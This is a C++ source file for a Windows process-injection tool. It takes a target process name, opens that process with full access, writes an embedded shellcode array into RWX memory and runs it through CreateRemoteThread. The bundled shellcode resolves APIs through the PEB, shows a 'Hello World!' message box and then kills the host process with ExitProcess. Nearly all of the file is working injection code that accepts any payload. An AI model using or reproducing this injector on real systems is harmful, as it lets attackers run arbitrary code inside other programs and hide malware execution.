#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <iostream>
#include <thread>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <synchapi.h>
using namespace std;
#define skinjbir 1
#define null NULL
DWORD GetProcessId(const char *tp){
		HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if(snap != INVALID_HANDLE_VALUE){
				PROCESSENTRY32 pe;
				pe.dwSize = sizeof(pe);
				if(Process32First(snap, &pe)){
						if(!pe.th32ProcessID){
								Process32Next(snap, &pe);
						}
						do{
								if(!strcmp(pe.szExeFile, tp)){
										cout << "Process Name : " << pe.szExeFile << endl;
										cout << "Process ID : " << pe.th32ProcessID << endl;
										break;
								}
						}while(Process32Next(snap, &pe));
				}
		return pe.th32ProcessID;
		}
		CloseHandle(snap);
} 
int main(void){
		unsigned char sc[] = 
		"\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c"
        "\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33"
        "\x75\xf2\x8b\xeb\x03\x6d\x3c\x8b\x6d\x78\x03\xeb"
        "\x8b\x45\x20\x03\xc3\x33\xd2\x8b\x34\x90\x03\xf3"
        "\x42\x81\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
        "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03\xf3\x66"
        "\x8b\x14\x56\x8b\x75\x1c\x03\xf3\x8b\x74\x96\xfc"
        "\x03\xf3\x33\xff\x57\x68\x61\x72\x79\x41\x68\x4c"
        "\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd6"
        "\x33\xc9\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
        "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01\xfe\x4c"
        "\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73"
        "\x54\x50\xff\xd6\x57\x68\x72\x6c\x64\x21\x68\x6f"
        "\x20\x57\x6f\x68\x48\x65\x6c\x6c\x8b\xcc\x57\x57"
        "\x51\x57\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
        "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74"
        "\x54\x53\xff\xd6\x57\xff\xd0";
		char ProcessName[500];
		cout << "Enter The Process Name : ";
		cin >> ProcessName;
		HANDLE op = OpenProcess(PROCESS_ALL_ACCESS, null, GetProcessId(ProcessName));
		// if op is valid
		if(op){
				void* vae = VirtualAllocEx(op, null, sizeof(sc), 0x00001000 | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				if(!vae){
						cout << "Process Id Not Found\nTry Open The Process.\n";
						return -1;
				}
				else{
						BOOL wpm = WriteProcessMemory(op, vae, sc, sizeof(sc), null);
						if(!wpm){
								cout << "failed to write a process memory\n";
								return -1;
						}
						else{
								// create a remote thread
								HANDLE rt = CreateRemoteThread(op, null, 0, (LPTHREAD_START_ROUTINE)vae, 0, null, null);
								if(!rt){
										cout << "failed to create a remote thread.\n";
										return -1;
								}
								else{
										cout << "thread created successfully.\n";
										DWORD wso = WaitForSingleObject(rt, INFINITE);
										if(wso == 0b11111111111111111111111111111111){
											cout << "the shellcode is injected unsucessfully.\n";
											return -1;	
										}
										else{
												cout << "the shellcode is injected successfully.\n";
										}
								}
						}
				}
		}
}
